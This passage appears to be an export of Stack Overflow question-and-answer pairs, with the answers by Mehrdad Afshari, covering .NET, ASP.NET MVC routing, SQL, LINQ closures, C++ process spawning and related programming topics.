      sorted = @items.sort { |a, b| b.price  a.price }
      expensive = Item.most_expensive
      expensive.should be(sorted[0])
      expensive.price.should >= 50      
    end
  end
end
</code></pre>  
</p>

<p>
This way, my tests better reveal surprising behavior.  When I generate data this way, I occasionally stumble upon an edge case where my code does not behave as expected, but which I wouldn't have caught if I were only using fixtures.  For example, in the case of '#most_expensive', if I forgot to handle the special case where multiple items share the most expensive price, my test would occasionally fail at the first 'should.'  Seeing the non-deterministic failures in AutoSpec would clue me in that something was wrong.  If I were only using fixtures, it might take much longer to discover such a bug.
</p>

<p> 
My tests also do a slightly better job of demonstrating in code what the expected behavior is.  My test makes it clear that sorted is an array of items sorted in descending order by price.  Since I expect '#most_expensive' to be equal to the first element of that array, it's even more obvious what the expected behavior of most_expensive is.
</p>

<p>
So, is this a bad practice?  Is my fear of fixtures an irrational one?  Is writing a generate_random method for each Model too much work?  Or does this work?
</p>
","33708","Mehrdad Afshari","<p>One problem with randomly generated test cases is that validating the answer should be computed by code and you can't be sure it doesn't have bugs :)</p>
"
"<p>Ok, so I'm new to VB.NET and trying to write a program that prompts the user for a server name and then restarts the IIS on that machine. </p>

<p>Problem 1) namespace <code>System.ServiceProcess</code> is not being recognized.<br />
Problem 2) need help with code, passing servername into sub.</p>

<pre><code>Imports System
Imports System.ServiceProcess
Imports System.IO
Imports System.Threading

Class RestartIIS
    Shared Sub Main()
        Run()
    End Sub

    Public Sub Run()
        Console.WriteLine(""Please enter the Server Name: "")
        Dim ServerName As String = Console.ReadLine()

        Dim sc As ServiceController = New ServiceController(""W3SVC"")

        sc.Stop()
        Thread.Sleep(2000)
        sc.Start()

        Console.Write(""Press Enter to Exit"")
        Console.ReadLine()
    End Sub
End Class
</code></pre>
","33708","Mehrdad Afshari","<p>You should add a reference to <code>System.ServiceProcess</code> assembly by right clicking the project and clicking Add Reference... and get command line arguments passed to the <code>Main</code> method like this:</p>

<pre><code>Imports System
Imports System.ServiceProcess
Imports System.IO
Imports System.Threading

Class RestartIIS
    Shared Sub Main(ByVal commandLineArgs() as String)
        Run(commandLineArgs(0))
    End Sub

    Public Sub Run(ByVal machineName as String)
        Console.WriteLine(""Please enter the Server Name: "")
        Dim ServerName As String = Console.ReadLine()

        Dim sc As ServiceController = New ServiceController(""W3SVC"", machineName)

        sc.Stop()
        Thread.Sleep(2000)
        sc.Start()

        Console.Write(""Press Enter to Exit"")
        Console.ReadLine()
    End Sub
End Class
</code></pre>
"
"<p>If I have a statement block like this:</p>

<pre><code>if (/*condition here*/){ }
else{ }
</code></pre>

<p>or like this: </p>

<pre><code>if (/*condition here*/)
else if (/*condition here*/) {}
else if (/*condition here*/) {}
</code></pre>

<p>What is the difference?</p>

<p>It seems that with if/else, if part is for true state and the else part is for all other possible options (false). An else-if would be useful for a number of conditions. This is my understanding, is there anything more I should be aware of?</p>
","33708","Mehrdad Afshari","<p><code>else if</code> basically means the <code>else</code> part of <code>if</code> is another <code>if</code> statement.</p>
"
"<p>Say, we have a program that gets user input or any other unpredictable events at arbitrary moments of time.</p>

<p>For each kind of event the program should perform some computation or access a resource, which is reasonably time-consuming to be considered. The program should output a result as fast as possible. If next events arrive, it might be acceptable to drop previous computations and take up new ones.</p>

<p>To complicate it further, some computations/resource access might be interdependent, i.e. produce data that can be used in other computations.</p>

<p>What's important we know the pattern in which these events usually occur. For example: their relative frequency with respect to each other, or a common order and time intervals in which they happen.</p>

<p>The task is to make an algorithm which deals with the problem in the most statistically efficient way. Approaches yielding sub-optimal solutions can be more than sufficient.</p>

<p>Is there a concept which embraces designing such algorithms?</p>

<p><hr /></p>

<p>Example:</p>

<p>A tabbed internet browser.</p>

<p>When told to load different web pages in several tabs, should decide whether to load the page in an active tab with higher priority, to render just the visible part of the page or pre-render the full page, if so what to do first - pre-render the whole page for the active tab or render other tabs instead, etc.</p>

<p>(I know nothing about how browsers actually work, but assuming it is this way won't hurt)</p>
","33708","Mehrdad Afshari","<p>I think <a href=""http://en.wikipedia.org/wiki/Scheduling%5Falgorithm"" rel=""nofollow"">scheduling algorithms</a> deal with these kind of scenarios.</p>
"
"<p>I wrote this - very simple - function, and then wondered does VB have some pre-built functionality to do this, but couldn't find anything specific.</p>

<pre><code>Private Shared Function MakeArray(Of T)(ByVal ParamArray args() As T) As T()
    Return args
End Function
</code></pre>

<p>Not so much to be used like</p>

<pre><code>Dim someNames() as string = MakeArray(""Hans"", ""Luke"", ""Lia"")
</code></pre>

<p>Because this can be done with</p>

<pre><code>Dim someNames() as string = {""Hans"", ""Luke"", ""Lia""}
</code></pre>

<p>But more like </p>

<pre><code>public sub PrintNames(names() as string)
   // print each name
End Sub

PrintNames(MakeArray(""Hans"", ""Luke"", ""Lia""))
</code></pre>

<p>Any ideas?</p>
","33708","Mehrdad Afshari","<pre><code>Dim somenames() As String = {""hello"", ""world""}
</code></pre>
"
"<p>With all the hype around functional programming, which are the best resources to getting started in functional programming [for a C# programmer]?  I am not looking for C# 3.0 language improvements.</p>
","33708","Mehrdad Afshari","<p>I think for a C# developer with .NET background, the best way to enter functional programming is to learn F#.</p>
"
"<p>see above...</p>
","33708","Mehrdad Afshari","<p>What you are asking is called <code>NATURAL JOIN</code> in relational terminology. Some database servers support this clause. I would prefer to manually specify the join expression even if the provider supports such a clause like:</p>

<pre><code>SELECT .... FROM Table1 JOIN Table2 ON Table1.JoinCol = Table2.JoinCol ...
</code></pre>
"
"<p>I have been looking for cloud computing / storage solutions for a long time (inspired by the Google Bigtable). But I can't find a easy-to-use, business-ready solution. </p>

<p>I'm searching a simple, fault tolerant, distributed Key=>Value DB like SimpleDB from Amazon.</p>

<p>I've seen things like:</p>

<ol>
<li><a href=""http://couchdb.apache.org/index.html"">The CouchDB Project</a> : Simple and distributed, fault-tolerant Database. But it understands only JSON. No XML connectors etc.</li>
<li><a href=""http://eucalyptus.cs.ucsb.edu/"">Eucalyptus</a> : Nice Amazon EC2 interfaces. Open Standards &amp; XML. But less distributed and less fault-tolerant? There are also a lot of open tickets with XEN/VMWare issues. </li>
<li><a href=""http://kosmosfs.sourceforge.net/index.html"">Cloudstore / Kosmosfs</a> : Nice distributed, fault tolerant fs. But it's hard to configure. Are there any java connectors? </li>
<li><a href=""http://hadoop.apache.org/"">Apache Hadoop</a> : Nice system which much more then abilities to store data. Uses its own Hadoop Distributed File System and has been testet on clusters with 2000 nodes.</li>
<li>*<a href=""http://aws.amazon.com/simpledb/"">Amazon SimpleDB</a> : Can't find an open-source alternative! It's a nice but expensive system for huge amounts of data. And you're addicted to Amazon.</li>
</ol>

<p>Are there other, better solutions out there? Which one is the best to choose? Which one offers the smallest amount of SOF(Singe Point of Failure)?</p>
","33708","Mehrdad Afshari","<p>You might want to take a look at this (using MySQL as key-value store):</p>

<p><a href=""http://bret.appspot.com/entry/how-friendfeed-uses-mysql"" rel=""nofollow"">http://bret.appspot.com/entry/how-friendfeed-uses-mysql</a></p>
"
"<p>I've started using MVC reccently, and one thing that occurs to me is whether its possible for the concept of a Control to exist in MVC?</p>

<p>From what I see the framework allows the application to be nicely factored into Models, Views and Controllers, but I can't think of a nice way to take a ""vertical slice"" of that application and reuse it in another application.</p>

<p>What I mean by that is it strikes me that any UI components I build with MVC maybe not very amenable to reuse, in the same way you can reuse a Contol in ASP.NET WebForms. Ok, there are HTML Helpers but I am thinking of something more modular. Something more like the control model in WPF.</p>

<p>Does this dichotomy go to the heart of MVC vs WebForms, or can reusable UI components work in an MVC world?</p>
","33708","Mehrdad Afshari","<p>You can still use <code>ascx</code> files and other features in ASP.NET Web Forms. The only missing piece in MVC is the postback model and view state oriented state management. There is no <code>&lt;form runat=""server""&gt;</code> anymore and no automatically generated hidden fields. Except these, all other features can be used in ASP.NET MVC. You can still write controls that post data using a REST based mechanism and use them in your views. </p>

<p>So, yes, as long as your controls don't rely on a server side form for postback, you can use them exactly the same way you'd use in ASP.NET Web Forms.</p>
"
"<p>I'm new to c# and I'm trying to figure out if I can create multiple derived class libraries that each represent a specific item.  I'll call the two class libraries ClassA &amp; ClassB.  Each class will share a BaseClass (namespace BaseNS).</p>

<p>I then created a c# app that refrences both ClassA and ClassB.  This generated an error because they both have the same BaseClass.  No problem, I used 'Alias' on the reference.  This worked fine. So I have:</p>

<p>extern alias Class1Alias;
extern alias Class2Alias;
...</p>

<p>Here is where I am running into a problem.</p>

<p>I want to make a function that takes BaseClass as an argument.<br />
    public void SetData(BaseClass bc) { }
Can't do this because BaseClass isn't defined because of the alias.  So it has to be:
    public void SetData(Class1Alias.BaseNameSpace.BaseClass bc) {}</p>

<p>This works, but now I want to do the following:
...</p>

<pre><code>Class1Alias.Class1Space.Class1 c1 = new Class1Alias.Class1Space.Class1();
Class2Alias.Class2Space.Class2 c2 = new Class2Alias.Class2Space.Class2();
</code></pre>

<p>this works</p>

<pre><code>Class1Alias.BaseNameSpace.BaseClass bc = (Class1Alias.BaseNameSpace.BaseClass)c1;
SetData(bc);
</code></pre>

<p>this doesn't</p>

<pre><code>Class1Alias.BaseNameSpace.BaseClass bc = (Class1Alias.BaseNameSpace.BaseClass)c2;
SetData(bc);
</code></pre>

<p>I tried casting it to Class2Alias, which works, but then I can't call my SetData function because it wants a Class1Alias.</p>

<p>Is there anyway to work around this?</p>
","33708","Mehrdad Afshari","<p>I am no sure if I understand the question correctly. Does the base class exist in a single assembly or it's copied and pasted in both assemblies? If it's copied and pasted, there's not much you can do as the compiler considers them as two different classes.</p>

<p>Set the assembly reference alias in properties window of the specific referenced assembly. Assign something other than <code>global</code> to it. Then you can reference the type in that assembly with something like:</p>

<pre><code>assemblyAlias::RootNamespace.OtherNamespace.Class
</code></pre>
"
"<p>I have a varchar email field in my table.  I can't figure out the sytnax to add a constraint that ensures a non-empty value cannot be inserted.  I""m not talking about not null, I'm talking not empty here.</p>
","33708","Mehrdad Afshari","<p>Add a <code>not null</code> and a <code>check</code> constraint.</p>

<pre><code>create table MyTable (
   email varchar(100) not null,
   constraint email_not_empty check (rtrim(ltrim(email)) != '')
)
</code></pre>
"
"<p>Why doesn't asp.net css link path work outside of the head tag?</p>

<p>I have this code in a master page: </p>

<pre><code>&lt;head runat=""server""&gt;
    &lt;title&gt;Untitled Page&lt;/title&gt;
    &lt;link href=""../CSS/default.css"" rel=""stylesheet"" type=""text/css"" runat=""server"" /&gt;
    &lt;asp:ContentPlaceHolder id=""head"" runat=""server""&gt;
    &lt;/asp:ContentPlaceHolder&gt;
&lt;/head&gt;
</code></pre>

<p>This seems to resolve the CSS link no mater what folder depth the page is at.</p>

<p>I notice that if you use the css link it only resolves to the correct path if it's in the head (if used in the body it does not work).</p>

<p>I know how to get around it by using ResolveUrl, but I am wondering if this is just how it works or if I'm missing something.</p>
","33708","Mehrdad Afshari","<p>Server controls will process relative URLs and will output the appropriate URL to the client. <code>&lt;head runat='server'&gt;</code> is a server control that does this. If you remove the <code>runat='server'</code> attribute, you'll see that this address translation won't happen anymore.</p>
"
"<p>Bash scripts are very useful and can save a lot of programming time. So how do you start a bash script in a C++ program? Also if you know how to make user become the super-user that would be nice also. Thanks!</p>
","33708","Mehrdad Afshari","<p>Use the <code>system</code> function.</p>

<pre><code>system(""myfile.sh""); // myfile.sh should be chmod +x
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/43116/how-can-i-run-an-external-program-from-c-and-parse-its-output"">How can I run an external program from C and parse its output?</a>  </p>
</blockquote>



<p>i want to run a command in linux, and get the text returned of what it outputs...but i DO NOT want this text printed to screen.  There has to be a more elegant way than making a temporary file right?</p>
","33708","Mehrdad Afshari","<p>This is a classic:</p>

<ol>
<li>Create a pipe.</li>
<li><code>fork();</code></li>
<li>In the child, configure file descriptors.</li>
<li><code>exec</code> the command in the child.</li>
</ol>
"
"<p>Is there any way to add <code>Field</code> (or <code>FieldInfo</code>, maybe this is the same) to a class at runtime?</p>
","33708","Mehrdad Afshari","<p>You can't alter a class definition at runtime. However, you can create a new class that inherits from the original class (if it's not <code>sealed</code>) and declares the field. You can do this by emitting the appropriate IL code using <code>System.Reflection.Emit</code>.</p>
"
"<p>I was going through a legacy code and found the following snippet:</p>

<pre><code>MyClass::~MyClass()
{
   EnterCriticalSection(&amp;cs);

//Access Data Members, **NO Global** members are being accessed here


  LeaveCriticalSection(&amp;cs);
}
</code></pre>

<p>I am wondering will it help by any chance to guard the destructor ? </p>

<p>Consider a scenario :</p>

<pre><code>1. Thread1 - About to execute any of the member function which uses critical section
2. Thread2-  About to execute destructor.
</code></pre>

<p>If the order of execution is 1=>2 then it might work. But what if the order is reversed ?</p>

<p>Is it a design issue ?</p>
","33708","Mehrdad","<p>The destructor should <strong>not be called when the object is in use</strong>. If you're dealing with such a situation, <strong>it needs a fundamental fix</strong>. However, the destructor might want to alter some other thing (which is unrelated to the class being destructed) and it might need a critical section (e.g. like decrementing a <em>global</em> counter).</p>
"
"<p>I'm new to ASP.NET and to SQL Server. I'm from the PHP/MySQL world, so I'm pretty confused with this stuff. I need help because I'm trying to make a simple blog as a first serious exercise. I can't figure out how to connect to my sql server from my c# code. my sql server is on the same machine as IIS. When i use SQL Server Management Studio, it says its connecting to BAMF\SQLEXPRESS. Is that what i should put in my connection string? A little guidance would be great.</p>
","33708","Mehrdad","<p>Yes, that would work on your machine. To make it more portable, you might want to use <code>.\SQLExpress</code> in which the dot means <em>the local machine</em> (whatever computer name it has) and <code>SQLExpress</code> is the <em>instance name</em> of the SQL Express installation.</p>
"
"<p>I'm not exactly sure how to word this but  I'll try.  </p>

<p>Suppose you have some settings in some piece of your program where your 80% sure you won't ever have to modify again.  How do you know where to draw the line on changeable code?  You know that taking the settings all the way to a user defined XML file is overkill.  However, you also know that there is a slight 20% chance that these settings may need to be changed later on so coding it at the place where the rubber meets the road isn't optimal either.  </p>

<p>I guess what I'm trying to ask is, how far up the abstraction tree should you allow your program to be easily changeable?  </p>

<p>One of many examples is writing the HTML code for a website manually vs having the program automatically generating it.  Writing the HTML code directly doesn't take too much time.  Writing the a program to automatically generate the HTML code takes much longer.  </p>
","33708","Mehrdad","<p>This is a good question but there is no absolute answer for it:</p>

<p>As noted by Einstein:</p>

<blockquote>
  <p>Make things as simple as possible but not simpler.</p>
</blockquote>

<p>Simplicity is relative. Making the best decision about the amount of abstraction layers in a design is what makes a great architect great. A good architect should always evaluate the particular situation and make the best trade-off. There aren't any silver bullets.</p>
"
"<p>Is there any way to access the backing field for a property in order to do validation, change tracking etc.?</p>

<p>Is something like the following possible? If not is there any plans to have it in .NET 4 / C# 4?</p>

<pre><code>public string Name
{
    get;
    set
    {
        if (value != &lt;Keyword&gt;)
        {
            RaiseEvent();
        }
        &lt;Keyword&gt; = value;
    }
}
</code></pre>

<p>The main issue I have is that using auto properties doesn't allow for the same flexibility in validation etc. that a property with a explicit backing field does. However an explicit backing field has the disadvantage in some situations of allowing the class it is contained in to access the backing field when it should be accessing and reusing the validation, change tracking etc. of the property just like any other class that may be accessing the property externally.</p>

<p>In the example above access to the backing field would be scoped to the property thus preventing circumvention of the property validation, change tracking etc.</p>

<p><strong>Edit:</strong> I've changed &lt; Backing Field > to &lt; Keyword >. I would propose a new keyword similar to value. <strong>field</strong> would do nicely although I'm sure it's being used in a lot of existing code.</p>
","33708","Mehrdad","<p>If you're gonna do so, why you are using auto properties?!</p>

<p>A simple property has done it way back in 1.0. I don't think it makes sense to add complexity to the language for every special case. You either need the property to do plain store/retrieve model or need more than that. In the latter case, a normal property will do.</p>
"
"<p>I'm trying to narrow down some weirdness going on with my AJAX calls.  My PHP scripts have this at the start:</p>

<pre><code>ob_start(""ob_gzhandler"");
</code></pre>

<p>Works great with HTML.  But are there any problems with doing it with application/json data?  Any browser issues anyone is aware of?</p>
","33708","Mehrdad","<p>You can give out gzipped content whenever the browser specifies <code>gzip</code> in <code>Accept-Encoding</code> request header. In that case, there is no difference between JSON and HTML and no problems will be caused whatsoever.</p>
"
"<p>Example:</p>

<p>MyProgram.exe is executed.  It calls MyClassLibrary1.dll which calls MyClassLibrary2.dll.  How can I determine from within MyClassLibrary2.dll what the assembly version of MyProgram.exe is?</p>

<p>Is this possible?</p>

<p>Thanks.</p>
","33708","Mehrdad","<pre><code>System.Reflection.Assembly.GetEntryAssembly().GetName().Version
</code></pre>
"
"<p>I have a </p>

<pre><code>List&lt;Cat&gt;
</code></pre>

<p>sorted by the cats' birthdays.  Is there an efficient Java Collections way of finding <strong>all the cats</strong> that were born on January 24th, 1983?  Or, what is a good approach in general?</p>
","33708","Mehrdad","<p>Binary search is the classic way to go.</p>

<p>Clarification: I said you use binary search. Not a single method specifically. The algorithm is:</p>

<pre><code>//pseudocode:

index = binarySearchToFindTheIndex(date);
if (index &lt; 0) 
  // not found

start = index;
for (; start &gt;= 0 &amp;&amp; cats[start].date == date; --start);
end = index;
for (; end &lt; cats.length &amp;&amp; cats[end].date == date; ++end);

return cats[ start .. end ];
</code></pre>
"
"<p>Are there rules of thumb for developers when to use join instead of subquery or are they the same.</p>
","33708","Mehrdad","<p>Performance-wise, they don't have any difference in most modern DB engines.</p>
"
"<p>I have the following code:</p>

<pre><code>
var tagToPosts = (from t2p in dataContext.TagToPosts
                                    join t in dataContext.Tags on t2p.TagId equals t.Id
                                    select new { t2p.Id, t.Name });
//IQueryable tag2postsToDelete;
foreach (Tag tag in tags)
{
    Debug.WriteLine(tag);
    tagToPosts = tagToPosts.Where(t => t.Name != tag.Name);
}
IQueryable tagToPostsToDelete = (from t2p in dataContext.TagToPosts
                                            join del in tagToPosts on t2p.Id equals del.Id
                                            select t2p);
dataContext.TagToPosts.DeleteAllOnSubmit(tagToPostsToDelete);
</code></pre>

<p>where <code>tags</code> is a <code>List&lt;Tag&gt;</code> - list of tags created by constructor, so they have no id.
I run the the code putting a brakepoint on line with Debug and wait for a few cycles to go. Then I put tagToPosts.ToList() in the Watch window for query to execute.
In SQL profiler I can see the following query:</p>

<pre><code>exec sp_executesql N'SELECT [t0].[Id], [t1].[Name]
FROM [dbo].[tblTagToPost] AS [t0]
INNER JOIN [dbo].[tblTags] AS [t1] ON [t0].[TagId] = [t1].[Id]
WHERE ([t1].[Name]  @p0) AND ([t1].[Name]  @p1) AND ([t1].[Name]  @p2)',N'@p0 nvarchar(4),@p1 nvarchar(4),@p2 nvarchar(4)',@p0=N'tag3',@p1=N'tag3',@p2=N'tag3'
</code></pre>

<p>We can see every parameter parameter have the value of last <code>tag.Name</code> in a cycle.
Have you any idea on how to get arout this and get cycle to add <code>Where</code> with new condition every tyme? I can see IQueryable stores only pointer to variable before execution. </p>
","33708","Mehrdad","<p>Change your <code>foreach</code> to:</p>

<pre><code>foreach (Tag tag in tags){
    var x = tag.Name;
    tagToPosts = tagToPosts.Where(t =&gt; t.Name != x);
}
</code></pre>

<p>The reason behind this is lazy evaluation and variable capturing. Basically, what you are doing in the <code>foreach</code> statement is <em>not</em> filtering out results as it might look like. You are building an expression tree that depends on some variables to execute. It's important to note that the actual variables are captured in that expression trees, not their values at the time of capture. Since the variable <code>tag</code> is used every time (and it's scope is the whole <code>foreach</code>, so it won't go out of scope at the end of each iteration), it's captured for every part of the expression and the last value will be used for <em>all</em> of its occurrences. The solution is to use a temporary variable which is scoped <em>in the foreach</em> so it'll go out of scope at each iteration and it the next iteration, it'll be considered a <strong>new variable</strong>.</p>
"
"<p>I'm attempting to connect to my published website using the following url.
<a href=""http://www.mywebsite.com/"" rel=""nofollow"">http://www.mywebsite.com/</a>
I keep getting:
The incoming request does not match any route.
Here are my routing rules:</p>

<pre><code>routes.MapRoute(
                ""Default"",                                              // Route name
                ""{controller}.aspx/{action}/{id}"",                           // URL with parameters
                new { controller = ""Home"", action = ""Index"", id = """" }  // Parameter defaults
            );

            routes.MapRoute(
                ""Default2"",                                              // Route name
                ""/"",                           // URL with parameters
                new { controller = ""Home"", action = ""Index"", id = """" }  // Parameter defaults
            );
</code></pre>

<p>I'm using authentication as such:</p>

<pre><code>&lt;authentication mode=""Forms"" &gt;
    		&lt;forms loginUrl=""~/Home.aspx/Index""
    				protection=""All""
    				timeout=""300""/&gt;
    	&lt;/authentication&gt;
</code></pre>

<p>When I'm not authenticated it goes to the correct page, but when I am authenticated it throws the above error.  I'm using IIS 6.0 and doing the whole rewriting url workaround option.</p>

<p>What am I missing?</p>
","33708","Mehrdad","<p>Change <code>""/""</code> in ""Default2"" route to <code>""""</code>:</p>

<pre><code>routes.MapRoute(""Default2"", """", new { ... });
</code></pre>

<p>Also make sure you have followed this guide: <a href=""http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx"" rel=""nofollow"">http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx</a> for <code>Default.aspx</code> file if you are on IIS6.</p>
"
"<p>I've got a single route in my <code>Global.asax.vb</code> page like this...</p>

<pre>
Shared Sub RegisterRoutes(ByVal routes As RouteCollection)
    routes.IgnoreRoute(""{resource}.axd/{*pathInfo}"")
    routes.MapRoute( _
        ""IdOnly"", _
        ""{id}"", _
        New With {.controller = ""Page"", _
                  .action = ""Details"", _
                  .id = ""7""} _
    )
End Sub
</pre>

<p>That <code>id</code> is for my home page.  It's displayed when someone navigates to my: <code>http://example.com/</code></p>

<p>But, this also works:  <code>http://example.com/7</code></p>

<p>I'd like to have no links anywhere on my site to the address with <code>id</code> of 7.  But, the <code>Html.RouteLink()</code> function generates those.</p>

<p>For a view Model that's a child of the home page&hellip;</p>

<pre><code>&lt;%=Html.RouteLink(Model.Parent.Title, _
                  ""IdOnly"", _
                  New With {.id = Model.Parent.Id})%&gt;
</code></pre>

<p>&hellip;generates the following anchor tag:</p>

<pre><code>&lt;a href=""/7""&gt;Home&lt;/a&gt;
</code></pre>

<p>How can I override the <code>href</code> generated by the <code>Html.RouteLink()</code> function for my home page?</p>
","33708","Mehrdad","<p>Add a new route before your ""IdOnly"" route for the home page:</p>

<pre><code>routes.MapRoute( _
    ""HomePage"", _
    """", _
    New With {.controller = ""Page"", _
              .action = ""Details"", _
              .id = ""7""} _
)
</code></pre>

<p><code>RouteLink</code> will use the first matched mapping in the routing table to generate the link.</p>
"
"<p>ASP.Net MVC is finally available as version 1. I have been waiting for an official release before I try to start using it. At the moment I have a dedicated web server which I have complete access to via remote desktop. It is running Win 2003 Server with IIS6 (I think it is IIS6, they don't print the version in the Help -> About but a bit of research says that IIS6 is the standard on Win 2003 Server) and .Net 2.0.</p>

<p>Obviously I will need to upgrade the framework to .Net 3.0. But after that, should everything else work? I thought I saw somewhere that .Net 3.0 insists on IIS7. If that is true is IIS7 compatible with Windows 2003 Server?</p>

<p>Also any literature you can point me to or any tips on making the upgrade/transition?</p>

<p><strong>EDIT:</strong>
Sorry too excited guys. Yes I meant .Net 3.5. :D</p>

<p>EDIT: LAST QUESTION:
Someone mentioned a routing problem. I remember reading that somewhere but can't quite remember. My project relies heavily on a good Google Ranking and I don't want to sacrifice page rank because of a routing problem. Will I still be able to get around it with IIS6? Thanks again. :D</p>
","33708","Mehrdad","<p>You'll need .NET Framework 3.5, not 3.0. Better be SP1. There'll be no problems with that setup. Make sure your read <a href=""http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx"" rel=""nofollow"">http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx</a></p>

<p>By the way, IIS7 cannot be installed on Windows Server 2003. ASP.NET MVC and .NET Framework 3.5 SP1 do not rely on any IIS7 specific features.</p>
"
"<p>I want to generate a couple of checkboxes on an ASP .NET MVC page. How can I retrieve their data in a controller after posting the page?</p>
","33708","Mehrdad","<p>Use the <code>Request.Form</code> collection:</p>

<pre><code>Request.Form[""control-id""]
</code></pre>

<p>or declare a <code>FormsCollection</code> parameter in your action method and use it to retrieve the value.</p>
"
"<p>I have a file in the website and  i m trying to send this file to windows application using the Response.BinaryWrite (getContent)( Where getContent is the byte array having the file which I need to send) vis HTTP post method only. Also I m adding a Header and Content-Type as application/octet-stream in the Response.</p>

<p>Now while reading the (httpWebResponse) response in the stream at client side(windows application) all the things (header + content-type + file +  some extra bytes) are getting added. so when I try to read the file in stream it cannot be loaded since the content has chnged
Is there any way to separate the file from rest contents present in the response object..
How sahll I save this file in directory </p>
","33708","Mehrdad","<p>Use <code>System.Net.WebClient.DownloadData</code> or <code>DownloadFile</code> method instead.</p>
"
"<p>I would like to be able to iterate through the values of a struct in C# (.Net 2.0).  This is to be done at runtime, with no knowledge of the possible values in the struct.  </p>

<p>I was thinking along the lines of either using Reflection to add the struct values to a list, or converting the struct to a data structure that implements the IEnumerable interface.  Can anyone provide any pointers?</p>

<p>Thanks in advance for your help.</p>

<p>Regards,
Andy.</p>
","33708","Mehrdad","<p>To make it work on every struct, you have to use reflection. If you want to declare a set of structs with this ability, you can make them implement <code>IEnumerable&lt;KeyValuePair&lt;string, object&gt;&gt;</code> and define <code>GetEnumerator()</code> as:</p>

<pre><code>yield return new KeyValuePair&lt;string, object&gt;(""Field1"", Field1);
yield return new KeyValuePair&lt;string, object&gt;(""Field2"", Field2);
// ... and so forth
</code></pre>
"
"<p>This is a question which has been asked before (<a href=""http://stackoverflow.com/questions/525690/large-text-and-images-in-sql"">large-text-and-images-in-sql</a>) but mainly for data which will be changed. In my case the data will be stored and never changed. Just seems sensible to keep everything together. </p>

<p>Are there any reasons why I should not store static binary data in a database?</p>

<p>Assuming it is a sensible thing to do, are there any advantages to storing such data in separate tables? (You might begin to realise now that I'm not a DB expert...)</p>

<p>Clarify:
There will probably be no more than 10-20 users but these will be in the US and in the UK. The binary data will have to be transfered in any case.</p>
","33708","Mehrdad","<p>The advantage of storing data in the DB is taking advantage of DB security mechanisms and reducing maintanence cost (backups, ...). The disadvantage of it is increasing DB load and consuming connections (which might be expensive for per-connection licensed database servers). If you are using SQL Server 2008, <a href=""http://technet.microsoft.com/en-us/library/bb933993.aspx""><code>FILESTREAM</code></a> might be a nice alternative.</p>

<p>By the way, for Web apps (or any other apps that might need streaming the data), it's usually more sensible to store data outside DB.</p>
"
"<p>I have a datatable with a bunch of rows in it, the first column is an <code>Int32</code> and I want to perform a simple select like:</p>

<pre><code>select * from MyDataTable where column1 = 234
</code></pre>
","33708","Mehrdad","<pre><code>var result = from row in table.AsEnumerable()
             where row[0].Equals(42)
             select row;
</code></pre>

<p>Or</p>

<pre><code>var result = table.AsEnumerable().Where(row =&gt; row[0].Equals(42));
</code></pre>
"
"<p>I have read some approaches to storing viewstate on the server:</p>

<p><a href=""http://aspalliance.com/72%5FServer%5FSide%5FViewstate"" rel=""nofollow"">Here is one</a></p>

<p><a href=""http://www.clanmonroe.com/Blog/archive/2008/08/05/efficient-server-side-view-state-persistence.aspx"" rel=""nofollow"">Here is another</a></p>

<p>But they are sort of complicated. I am looking for a way to persist an object without having to serialize it. I could use session state, but if a user opens more than one window, there could be overwrites of the object. </p>

<p>Is there a simple solution to this?</p>
","33708","Mehrdad","<p>Assign a number to each window the user might open. Append that number to the session key. You should also store the number somewhere in page (querystring or a hidden input) to be able to retrieve the appropriate session variable.</p>
"
"<p>I'm storing a bunch of supposedly-unique item IDs as a key and the file locations as the value in a hash table while traversing a table.  While I am running through it, I need to make sure that they key/location pair is unique or throw an error message.  I have the hashtable set up and am loading the values, but am not sure what to test:</p>

<pre><code>Hashtable check_for_duplicates = new HashTable();
foreach (object item in items)
{
    if (check_for_duplicates.ContainsKey(item[""ItemID""]) &amp;&amp;
        //what goes here?  Would be contains item[""Path""] as the value for the key)
    {
        //throw error
    }
}
</code></pre>
","33708","Mehrdad","<p>If you were using <code>Dictionary</code> instead, the <code>TryGetValue</code> method would help. I don't think there is a really better way for the pretty much deprecated <code>Hashtable</code> class.</p>

<pre><code>object value;
if (dic.TryGetValue(""key"", out value) &amp;&amp; value == thisValue)
  // found duplicate
</code></pre>
"
"<p>I want to create Windows Service that acts as a HTTP listener and can handle around 500 clients. Are there any special considerations for this kind of service.</p>

<p>I am a little confused between the HTTPListener class and the TCPListener class. Which one  to use for a Windows Service that will:</p>

<ol>
<li>Accept the client connection (around 500)</li>
<li>Process client request</li>
<li>Call another Http based service</li>
<li>Return some value to the calling client</li>
</ol>

<p><hr /></p>

<p>This is what I am doing to start the listener.</p>

<pre><code>    listener = new HttpListener();
    listener.Prefixes.Add(""http://localhost:8080/"");
    listener.Start();
    listener.BeginGetContext(new AsyncCallback(OnRequestReceive), listener);

private void OnRequestReceive(IAsyncResult result)
{
     HttpListener listener = (HttpListener)result.AsyncState;
     // Call EndGetContext to complete the asynchronous operation.
     HttpListenerContext context = listener.EndGetContext(result);
     HttpListenerRequest request = context.Request;
}
</code></pre>

<p>Will I be able to handle N clients simultaneously?</p>
","33708","Mehrdad","<p>I'd use <code>HttpListener</code> class. It does many stuff for you and you wouldn't need to reinvent the wheel. Also it integrates with kernel mode <code>http.sys</code> driver in Windows Server 2003 and should offer better performance.</p>
"
"<p>I've come across a query in an application that I've inherited that looks like this:</p>

<pre><code>Select *
From foo
where
    1 &lt;&gt; 1
</code></pre>

<p>As I parse that, it should return nothing (<code>1 &lt;&gt; 1</code> should evaluate to false, right). However (at least on my Oracle box) it comes back with a full listing of everything in <code>foo</code>. When I try the same thing in MSAccess/Jet and MSSQL I get the behaviour I expect.
Why is it different for Oracle (and why would the original developer want to do this)?</p>

<p>Note: I've seen some superstition about the +s and -s of using ""where 1 = 1"", and it causing full table scans; but I don't think this is what the original developer was intending.</p>

<p><strong>Small Update:</strong><br />
In this case <code>foo</code> is a view. When I try the same thing on on an actual table, I get what I would expect (no rows). </p>

<p><strong>Update 2:</strong><br />
I've following the code further down the rabbit hole and determined that all he's doing is trying to grab the field/column names. I'm still at a loss as to why it's returning the full record set; but only on views. </p>

